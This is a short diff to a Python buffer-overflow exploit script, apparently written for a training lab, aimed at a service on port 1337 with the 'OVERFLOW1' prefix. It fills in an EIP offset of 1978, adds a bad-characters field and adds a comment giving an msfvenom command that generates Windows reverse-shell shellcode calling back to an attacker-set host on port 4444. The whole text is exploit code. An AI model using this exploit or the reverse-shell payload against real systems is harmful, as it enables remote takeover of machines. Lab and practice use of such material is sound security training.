@@ -2,14 +2,18 @@
 
 import socket, time, sys
 
-ip = "10.10.61.84"
+
+# Generate a shellcode using the command: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+ip = "10.10.48.81"
 
 port = 1337
 timeout = 5
 prefix = "OVERFLOW1 "
 eip = 'BBBB'
-offset = ''
-string = prefix + "A" * offset + eip
+offset = 1978
+badchars = ''
+
+string = prefix + "A" * offset + eip + badchars
 
 while True:
   try:
@@ -25,3 +29,4 @@ while True:
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
+
